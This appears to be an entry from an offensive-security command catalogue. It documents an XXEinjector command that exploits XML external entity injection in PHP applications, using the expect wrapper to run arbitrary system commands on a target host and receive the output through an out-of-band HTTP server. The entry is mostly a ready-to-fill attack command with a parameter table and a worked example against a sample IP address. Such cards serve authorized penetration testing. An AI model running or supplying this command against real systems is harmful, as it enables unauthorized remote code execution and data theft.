---
id: bc9b9bf3-690f-4bf0-9a6a-ed3551e975ce
name: xxeinjector-execute-command-php-expect
type: command
executor: bash
data: >-
  ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --oob=http --phpfilter
  --expect=$__COMMAND
output: null
created_at: '2023-04-06T03:56:43.973769+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
tags:
  - xxe
  - rce
  - php
verified: true
validated: true
---

# xxeinjector-execute-command-php-expect

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --oob=http --phpfilter --expect=$__COMMAND
```

## Description

Executes a system command on the target using PHP expect filter and HTTP OOB XXE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --oob=http | HTTP OOB | Built-in |
| --phpfilter | Use PHP filter | Built-in |
| --expect=$__COMMAND | Command to execute (e.g., ls) | Yes |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
```

## Expected Output

Command output received on OOB server.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
